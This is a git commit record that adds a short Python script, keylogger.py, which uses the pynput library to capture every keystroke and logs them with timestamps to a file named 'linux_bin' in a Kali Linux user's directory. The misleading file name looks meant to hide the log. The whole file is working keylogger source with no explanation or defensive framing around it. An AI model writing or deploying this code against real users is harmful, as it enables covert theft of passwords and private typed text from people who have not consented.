d036adc4bcf76f0068e961ff726f4002fb4c29c7
JoshuaFerando <159110543+JoshuaFerando@users.noreply.github.com>
2025-07-08 00:41:04 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,20 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = "/home/kali/Documents/Scripts_Tools/security/"
+
+
+
+# Set logging configurations
+logging.basicConfig(
+    # Set file path
+    filename=(log_dir + "linux_bin"), 
+    level=logging.DEBUG, 
+    format='%(asctime)s: %(message)s'
+)
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
